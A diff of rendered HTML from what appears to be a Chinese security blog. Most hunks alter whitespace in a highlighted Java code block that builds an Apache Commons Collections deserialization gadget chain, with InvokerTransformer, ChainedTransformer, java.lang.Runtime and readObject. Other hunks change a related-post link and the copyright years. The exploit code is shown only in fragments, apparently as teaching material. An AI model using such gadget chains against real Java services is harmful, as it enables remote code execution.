-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test2</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">rc</span><span class="o">=</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span><span class="w">
@@ -1348,7 +1348,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">objectInputStream</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">objectInputStream</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div>
@@ -1445,12 +1445,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-%E9%B9%8F%E7%A8%8B%E6%9D%AF/">
+    <a href="/p/cb%E9%93%BE/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-鹏程杯</h2>
+            <h2 class="article-title">CB链</h2>
         </div>
     </a>
 </article>
@@ -1515,7 +1515,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
